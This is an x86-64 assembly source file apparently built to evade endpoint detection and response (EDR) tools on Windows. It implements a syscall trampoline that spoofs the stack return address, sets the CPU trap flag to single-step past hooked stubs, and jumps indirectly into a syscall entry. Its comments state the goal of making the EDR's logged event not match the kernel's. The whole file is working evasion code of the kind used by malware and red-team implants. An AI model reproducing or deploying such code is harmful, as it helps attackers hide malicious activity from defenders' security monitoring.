BITS 64

section         .data
global          SYSCALL_INFORMATION_LOOKUP
global          REAL_RETURN
global          FUNCTION_ENTRY
global          SYSTEM_SERVICE_NUMBER

SYSCALL_INFORMATION_LOOKUP:     DB 0
REAL_RETURN:                    DQ 0
FAKE_RETURN:                    DQ 0
FUNCTION_ENTRY:                 DQ 0
SYSTEM_SERVICE_NUMBER:          DD 0

section         .text
global          TRAMPOLINE
global          FUNCTION_STUB
global          TRAMPOLINE_EXIT

; A syscall information lookup requires stub entry. If a stub is hooked,
; the initial inspection return address may be saved. EDR emitted event
; would not match kernel emitted event.

; On initial entry, the return address is saved. On re-entry, the re-entered
; return address is saved. The syscall is jumped to indirectly. After
; syscall execution, return address is restored.

TRAMPOLINE:
        INITIALIZE_LOOKUP:
                MOV     AL,     BYTE    [SYSCALL_INFORMATION_LOOKUP]
                CMP     AL,     0
                JZ      SPOOF_RETURN_ADDRESS
                JMP     SAVE_CURRENT_RETURN

        SPOOF_RETURN_ADDRESS:
                MOV     RAX,    QWORD   [RSP]
                MOV     QWORD   [REAL_RETURN],  RAX

                MOV     RAX,    QWORD   [FAKE_RETURN]
                CMP     RAX,    0
                JZ      TRAP_WALK
                MOV     QWORD   [RSP],  RAX
                JMP     TRAP_WALK

        SAVE_CURRENT_RETURN:
                MOV     RAX,    QWORD   [RSP]
                MOV     QWORD   [FAKE_RETURN],  RAX

        TRAP_WALK:
                PUSHFQ
                OR      QWORD   [RSP],  0x100
                POPFQ

        FUNCTION_STUB:
                MOV     R10,    RCX
                MOV     EAX,    DWORD   [REL SYSTEM_SERVICE_NUMBER]
                JMP     QWORD   [REL FUNCTION_ENTRY]

        TRAMPOLINE_EXIT:
                MOV     QWORD   [FAKE_RETURN],                  0
                MOV     QWORD   [REAL_RETURN],                  0
                MOV     BYTE    [SYSCALL_INFORMATION_LOOKUP],   0
                RET
TRAMPOLINE_END: